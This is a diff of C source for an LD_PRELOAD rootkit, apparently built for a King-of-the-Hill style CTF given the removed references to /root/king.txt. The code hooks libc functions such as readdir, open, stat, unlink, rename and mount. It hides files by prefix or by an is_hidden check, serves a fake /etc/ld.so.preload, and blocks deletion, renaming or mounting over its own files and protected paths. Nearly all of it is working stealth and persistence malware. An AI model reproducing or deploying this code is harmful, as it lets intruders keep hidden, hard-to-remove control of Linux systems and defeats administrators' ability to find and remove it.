@@ -3,6 +3,7 @@
  */
 
 
+#include <stddef.h>
 #define _GNU_SOURCE
 
 #include <linux/limits.h>
@@ -305,15 +306,22 @@ struct dirent *readdir(DIR *dirp) {
     int fd = dirfd(dirp);
     char *dir_path = fd_to_path(fd);
     errno = 0; //set errno to 0 or ls will think that an error occured when NULL is returned at the end of the directory, realpath() in fd_to_path() seems to set errno to 22 (EINVAL)
-    struct dirent *ep = (*original_readdir)(dirp);
-    while (ep != NULL && (
-        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
-        (!strcmp(dir_path, "/etc") && !strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK) )
-        )
-    ) {
-        ep = (*original_readdir)(dirp); //skip this entry
-    }
+    size_t dir_len = strlen(dir_path);
+    char full_path[PATH_MAX];
+    strncpy(full_path, dir_path, sizeof(full_path));
     free(dir_path);
+    full_path[dir_len] = '/'; //note that the string isn't null-terminated anymore
+    dir_len++;
+    struct dirent *ep;
+    do {
+        ep = (*original_readdir)(dirp);
+        if (ep == NULL) return ep;
+        strncpy((full_path + dir_len), ep->d_name, (sizeof(full_path) - dir_len));
+    } while (
+        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
+        (!strcmp(full_path, "/etc/ld.so.preload") && access(FAKE_PRELOAD, F_OK) ) ||
+        is_hidden(full_path)
+    );
     return ep;
 }
 
@@ -325,15 +333,23 @@ struct dirent64 *readdir64(DIR *dirp) {
     original_readdir64 = syscall_address(original_readdir64, "readdir64");
     int fd = dirfd(dirp);
     char *dir_path = fd_to_path(fd);
-    struct dirent64 *ep = (*original_readdir64)(dirp);
-    while (ep != NULL && (
-        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
-        (!strcmp(dir_path, "/etc") && !strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK) )
-        )
-    ) {
-        ep = (*original_readdir64)(dirp); //skip this entry
-    }
+    errno = 0; //set errno to 0 or ls will think that an error occured when NULL is returned at the end of the directory, realpath() in fd_to_path() seems to set errno to 22 (EINVAL)
+    size_t dir_len = strlen(dir_path);
+    char full_path[PATH_MAX];
+    strncpy(full_path, dir_path, sizeof(full_path));
     free(dir_path);
+    full_path[dir_len] = '/'; //note that the string isn't null-terminated anymore
+    dir_len++;
+    struct dirent64 *ep;
+    do {
+        ep = (*original_readdir64)(dirp);
+        if (ep == NULL) return ep;
+        strncpy((full_path + dir_len), ep->d_name, (sizeof(full_path) - dir_len));
+    } while (
+        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
+        (!strcmp(full_path, "/etc/ld.so.preload") && access(FAKE_PRELOAD, F_OK) ) ||
+        is_hidden(full_path)
+    );
     return ep;
 }
 
@@ -346,13 +362,12 @@ FILE *fopen(const char *restrict pathname, const char *restrict mode) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_fopen)(pathname, mode);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         mode = "r";
-        king();
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
+    else if (is_hidden(real_pathname))
         pathname = "/dev/null";
     free(real_pathname);
 	return (*original_fopen)(pathname, mode);
@@ -367,13 +382,12 @@ FILE *fopen64(const char *restrict pathname, const char *restrict mode) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_fopen64)(pathname, mode);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         mode = "r";
-        king();
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
+    else if (is_hidden(real_pathname))
         pathname = "/dev/null";
     free(real_pathname);
 	return (*original_fopen64)(pathname, mode);
@@ -388,13 +402,12 @@ int open(const char *pathname, int flags, ...) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_open)(pathname, flags, FILEMODE);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         flags = O_RDONLY;
-        king();
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
+    else if (is_hidden(real_pathname))
         pathname = "/dev/null";
     free(real_pathname);
     return (*original_open)(pathname, flags, FILEMODE);
@@ -409,13 +422,12 @@ int open64(const char *pathname, int flags, ...) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_open64)(pathname, flags, FILEMODE);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         flags = O_RDONLY;
-        king();
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
+    else if (is_hidden(real_pathname))
         pathname = "/dev/null";
     free(real_pathname);
     return (*original_open64)(pathname, flags, FILEMODE);
@@ -430,14 +442,13 @@ int creat(const char *pathname, mode_t mode) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_creat)(pathname, mode);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
-        king();
+    if (is_protected(real_pathname)) {
         free(real_pathname);
         return 0;
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         return 0;
     }
@@ -454,14 +465,13 @@ int creat64(const char *pathname, mode_t mode) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_creat64)(pathname, mode);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
-        king();
+    if (is_protected(real_pathname)) {
         free(real_pathname);
         return 0;
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         return 0;
     }
@@ -478,13 +488,12 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
     if (real_pathname == NULL)
         return (*original_openat)(dirfd, pathname, flags, FILEMODE);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         flags = O_RDONLY;
-        king();
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
+    else if (is_hidden(real_pathname))
         pathname = "/dev/null";
     free(real_pathname);
     return (*original_openat)(dirfd, pathname, flags, FILEMODE);
@@ -499,13 +508,12 @@ int openat64(int dirfd, const char *pathname, int flags, ...) {
     char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
     if (real_pathname == NULL)
         return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         flags = O_RDONLY;
-        king();
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
+    else if (is_hidden(real_pathname))
         pathname = "/dev/null";
     free(real_pathname);
     return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
@@ -522,7 +530,7 @@ int access(const char *pathname, int mode) {
         return (*original_access)(pathname, mode);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -542,7 +550,7 @@ int faccessat(int dirfd, const char *pathname, int mode, int flags) {
         return (*original_faccessat)(dirfd, pathname, mode, flags);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -562,7 +570,7 @@ int stat(const char *restrict pathname, struct stat *statbuf) {
         return (*original_stat)(pathname, statbuf);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -582,7 +590,7 @@ int stat64(const char *restrict pathname, struct stat64 *statbuf) {
         return (*original_stat64)(pathname, statbuf);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -603,7 +611,7 @@ int lstat(const char *restrict pathname, struct stat *statbuf) {
         return (*original_lstat)(pathname, statbuf);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -623,7 +631,7 @@ int lstat64(const char *restrict pathname, struct stat64 *statbuf) {
         return (*original_lstat64)(pathname, statbuf);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -643,7 +651,7 @@ int fstatat(int dirfd, const char *restrict pathname, struct stat *restrict stat
         return (*original_fstatat)(dirfd, pathname, statbuf, flags);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -664,7 +672,7 @@ int fstatat64(int dirfd, const char *restrict pathname, struct stat64 *restrict 
         return (*original_fstatat64)(dirfd, pathname, statbuf, flags);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -684,7 +692,7 @@ int statx(int dirfd, const char *restrict pathname, int flags, unsigned int mask
         return (*original_statx)(dirfd, pathname, flags, mask, statxbuf);
     if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -702,14 +710,14 @@ int remove(const char *pathname) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL) //catch errors like ENOENT
         return (*original_remove)(pathname);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         free(real_pathname);
         errno = EPERM;
         return -1;
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -727,13 +735,13 @@ int unlink(const char *pathname) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL) //catch errors like ENOENT
         return (*original_unlink)(pathname);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         free(real_pathname);
         errno = EPERM;
         return -1;
     } else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -751,13 +759,13 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
     char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
     if (real_pathname == NULL)
         return (*original_unlinkat)(dirfd, pathname, flags);
-    if (!strcmp(real_pathname, "/root/king.txt")) {
+    if (is_protected(real_pathname)) {
         free(real_pathname);
         errno = EPERM;
         return -1;
     } else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
         pathname = FAKE_PRELOAD;
-    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
+    else if (is_hidden(real_pathname)) {
         free(real_pathname);
         errno = ENOENT;
         return -1;
@@ -779,7 +787,7 @@ int rename(const char *oldpath, const char *newpath) {
         free(real_newpath);
         return (*original_rename)(oldpath, newpath);
     }
-    if (!strcmp(real_oldpath, "/root/king.txt") || !strcmp(real_newpath, "/root/king.txt")) {
+    if (is_protected(real_oldpath) || is_protected(real_newpath)) {
         free(real_oldpath);
         free(real_newpath);
         errno = EPERM;
@@ -787,7 +795,7 @@ int rename(const char *oldpath, const char *newpath) {
     }
     if (!strcmp(oldpath, "/etc/ld.so.preload"))
         oldpath = FAKE_PRELOAD;
-    else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
+    else if (is_hidden(real_oldpath)) {
         free(real_oldpath);
         free(real_newpath);
         errno = ENOENT;
@@ -795,7 +803,7 @@ int rename(const char *oldpath, const char *newpath) {
     }
     if (!strcmp(real_newpath, "/etc/ld.so.preload"))
         newpath = FAKE_PRELOAD;
-    else if (!strcmp(real_newpath, FAKE_PRELOAD) || !strcmp(real_newpath, LIB_PATH)) {
+    else if (is_hidden(real_newpath)) {
         original_remove = syscall_address(original_remove, "remove");
         free(real_oldpath);
         free(real_newpath);
@@ -819,7 +827,7 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
         free(real_newpath);
         return (*original_renameat)(olddirfd, oldpath, newdirfd, newpath);
     }
-    if (!strcmp(real_oldpath, "/root/king.txt") || !strcmp(real_newpath, "/root/king.txt")) {
+    if (is_protected(real_oldpath) || is_protected(real_newpath)) {
         free(real_oldpath);
         free(real_newpath);
         errno = EPERM;
@@ -827,7 +835,7 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
     }
     if (!strcmp(oldpath, "/etc/ld.so.preload"))
         oldpath = FAKE_PRELOAD;
-    else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
+    else if (is_hidden(real_oldpath)) {
         free(real_oldpath);
         free(real_newpath);
         errno = ENOENT;
@@ -835,7 +843,7 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
     }
     if (!strcmp(real_newpath, "/etc/ld.so.preload"))
         newpath = FAKE_PRELOAD;
-    else if (!strcmp(real_newpath, FAKE_PRELOAD) || !strcmp(real_newpath, LIB_PATH)) {
+    else if (is_hidden(real_newpath)) {
         original_remove = syscall_address(original_remove, "remove");
         free(real_oldpath);
         free(real_newpath);
@@ -859,7 +867,7 @@ int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpa
         free(real_newpath);
         return (*original_renameat2)(olddirfd, oldpath, newdirfd, newpath, flags);
     }
-    if (!strcmp(real_oldpath, "/root/king.txt") || !strcmp(real_newpath, "/root/king.txt")) {
+    if (is_protected(real_oldpath) || is_protected(real_newpath)) {
         free(real_oldpath);
         free(real_newpath);
         errno = EPERM;
@@ -867,7 +875,7 @@ int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpa
     }
     if (!strcmp(oldpath, "/etc/ld.so.preload"))
         oldpath = FAKE_PRELOAD;
-    else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
+    else if (is_hidden(real_oldpath)) {
         free(real_oldpath);
         free(real_newpath);
         errno = ENOENT;
@@ -875,7 +883,7 @@ int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpa
     }
     if (!strcmp(real_newpath, "/etc/ld.so.preload"))
         newpath = FAKE_PRELOAD;
-    else if (!strcmp(real_newpath, FAKE_PRELOAD) || !strcmp(real_newpath, LIB_PATH)) {
+    else if (is_hidden(real_newpath)) {
         original_remove = syscall_address(original_remove, "remove");
         free(real_oldpath);
         free(real_newpath);
@@ -896,13 +904,13 @@ int link(const char *oldpath, const char *newpath) {
     if (real_oldpath == NULL) {
         return (*original_link)(oldpath, newpath);
     }
-    if (!strcmp(real_oldpath, "/root/king.txt")) {
+    if (is_protected(real_oldpath)) {
         free(real_oldpath);
         errno = EPERM;
         return -1;
     } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
         oldpath = FAKE_PRELOAD;
-    } else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
+    } else if (is_hidden(real_oldpath)) {
         free(real_oldpath);
         errno = ENOENT;
         return -1;
@@ -921,13 +929,13 @@ int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath,
     if (real_oldpath == NULL) {
         return (*original_linkat)(olddirfd, oldpath, newdirfd, newpath, flags);
     }
-    if (!strcmp(real_oldpath, "/root/king.txt")) {
+    if (is_protected(real_oldpath)) {
         free(real_oldpath);
         errno = EPERM;
         return -1;
     } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
         oldpath = FAKE_PRELOAD;
-    } else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
+    } else if (is_hidden(real_oldpath)) {
         free(real_oldpath);
         errno = ENOENT;
         return -1;
@@ -949,7 +957,27 @@ int mount(const char *source, const char *target, const char *filesystemtype, un
         free(real_target);
         return (*original_mount)(source, target, filesystemtype, mountflags, data);
     }
-    if (!strcmp(real_source, "/dev/xvda1") || !strcmp(real_source, "/") || !strcmp(real_source, "/root") || !strcmp(real_source, "/root/king.txt") || !strcmp(real_target, "/") || !strcmp(real_target, "/root") || !strcmp(real_target, "/root/king,txt")) { // /dev/xvda1 is a common device for the root filesystem
+    if (!strcmp(real_source, "/") ||
+        !strcmp(real_source, "/dev") ||
+        !strcmp(real_source, "/lib") ||
+        !strcmp(real_source, "/etc") ||
+        !strncmp(real_source, "/proc", 5) ||
+        !strcmp(real_source, "/root") ||
+        !strcmp(real_source, "/dev/xvda1") ||
+        !strcmp(real_source, "/") ||
+        is_protected(real_source) ||
+        is_hidden(real_source) ||
+        !strcmp(real_target, "/") ||
+        !strcmp(real_target, "/dev") ||
+        !strcmp(real_target, "/lib") ||
+        !strcmp(real_target, "/etc") ||
+        !strncmp(real_target, "/proc", 5) ||
+        !strcmp(real_target, "/root") ||
+        !strcmp(real_target, "/dev/xvda1") ||
+        !strcmp(real_target, "/") ||
+        is_protected(real_target) ||
+        is_hidden(real_target)
+    ) { // /dev/xvda1 is a common device for the root filesystem
         free(real_source);
         free(real_target);
         return 0; //exit silently
